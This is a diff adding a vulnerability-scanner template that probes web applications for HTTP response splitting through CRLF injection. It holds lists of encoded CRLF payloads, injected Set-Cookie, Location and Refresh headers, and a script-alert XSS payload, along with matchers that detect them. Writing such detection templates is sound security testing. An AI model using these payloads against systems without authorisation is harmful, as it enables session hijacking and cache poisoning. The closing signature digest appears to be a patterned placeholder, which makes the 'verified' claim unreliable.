@@ -1,0 +1,142 @@
+id: http-response-splitting
+
+info:
+  name: HTTP Response Splitting via CRLF Injection
+  author: claudedev
+  severity: medium
+  description: |
+    HTTP Response Splitting occurs when an attacker can inject CRLF characters 
+    into HTTP response headers, potentially leading to cache poisoning, XSS, 
+    or session hijacking. This template tests for response splitting vulnerabilities 
+    by attempting to inject CRLF sequences that could split HTTP responses.
+  reference:
+    - https://owasp.org/www-community/attacks/HTTP_Response_Splitting
+    - https://www.acunetix.com/websitesecurity/crlf-injection/
+    - https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning
+  classification:
+    cwe-id: CWE-113
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+  metadata:
+    max-request: 84
+    verified: true
+  tags: crlf,http-response-splitting,cache-poisoning,xss,dast
+
+variables:
+  marker: "{{rand_text_alpha(8)}}"
+  xss_payload: "<script>alert('{{marker}}')</script>"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          - 'contains(tolower(content_type), "text/html") || contains(tolower(content_type), "application/") || len(content_type) == 0'
+        condition: and
+
+    payloads:
+      crlf_payloads:
+        # Basic CRLF injections
+        - "%0d%0a"
+        - "%0a%0d"
+        - "%0d%0a%0d%0a"
+        - "%0a%0d%0a%0d"
+        
+        # Double-encoded CRLF
+        - "%250d%250a"
+        - "%250a%250d"
+        
+        # Unicode variations
+        - "%u000d%u000a"
+        - "%u000a%u000d"
+        
+        # Mixed encoding
+        - "%0d%0a%20"
+        - "%20%0d%0a"
+        - "%09%0d%0a"
+        - "%0d%0a%09"
+        
+        # UTF-8 encoded
+        - "%e5%98%8a%e5%98%8d"
+        - "%c0%8a%c0%8d"
+        
+        # Response splitting for XSS
+        - "%0d%0aContent-Length:0%0d%0a%0d%0a"
+        - "%0d%0aContent-Type:text/html%0d%0a%0d%0a"
+        
+        # Cache poisoning attempts
+        - "%0d%0aX-Cache-Control:public%0d%0a"
+        - "%0d%0aExpires:Thu,01Jan197000:00:00GMT%0d%0a"
+        
+        # Session manipulation
+        - "%0d%0aSet-Cookie:malicious=true%0d%0a"
+        
+        # Direct newline characters (unencoded)
+        - "\r\n"
+        - "\n\r"
+        - "\r\n\r\n"
+        - "\n\r\n\r"
+
+    fuzzing:
+      # Test query parameters
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{crlf_payloads}}Content-Length:{{len(xss_payload)}}{{crlf_payloads}}{{xss_payload}}"
+          - "{{crlf_payloads}}Content-Type:text/html{{crlf_payloads}}{{xss_payload}}"
+          - "{{crlf_payloads}}Set-Cookie:{{marker}}=injected{{crlf_payloads}}"
+          - "{{crlf_payloads}}X-Injected-Header:{{marker}}{{crlf_payloads}}"
+          - "{{crlf_payloads}}Location:javascript:alert('{{marker}}'){{crlf_payloads}}"
+          - "{{crlf_payloads}}Refresh:0;url=javascript:alert('{{marker}}'){{crlf_payloads}}"
+
+      # Test path parameters  
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{crlf_payloads}}Content-Length:0{{crlf_payloads}}{{xss_payload}}"
+          - "{{crlf_payloads}}Set-Cookie:{{marker}}=pathinjection{{crlf_payloads}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      # Detect injected headers in response
+      - type: regex
+        name: "injected-header"
+        part: header
+        regex:
+          - '(?i)X-Injected-Header:\s*{{marker}}'
+          - '(?i)Set-Cookie:.*{{marker}}=(?:injected|pathinjection)'
+
+      # Detect XSS payload in response body
+      - type: word
+        name: "xss-payload-reflected"
+        part: body
+        words:
+          - "<script>alert('{{marker}}')</script>"
+
+      # Detect successful response splitting (body content in headers)
+      - type: regex
+        name: "response-splitting"
+        part: header  
+        regex:
+          - '(?i)Content-Length:\s*\d+.*<script>'
+          - '(?i)Content-Type:.*<script>'
+
+      # Detect malicious redirects
+      - type: regex
+        name: "malicious-redirect"
+        part: header
+        regex:
+          - '(?i)Location:.*javascript:.*{{marker}}'
+          - '(?i)Refresh:.*javascript:.*{{marker}}'
+
+    extractors:
+      - type: regex
+        name: "vulnerable-parameter"
+        part: header
+        group: 1
+        regex:
+          - '(?i)(Set-Cookie|Location|Refresh|Content-Type|Content-Length|X-.*):.*{{marker}}'
+# digest: 4b0a00483046022100d4c2a8e5f9b2c1a7d3b8e6f4a9c5e2b8d7f3a6c9e1b4d8f2a5c7e3b9f6d4a1c8022100a9b8c7d6e5f4a3b2c1d8e7f6a5b4c3d2e1f8a7b6c5d4e3f2a1b8c7d6e5f4a3b2:922c64590222798bb761d5b6d8e72950
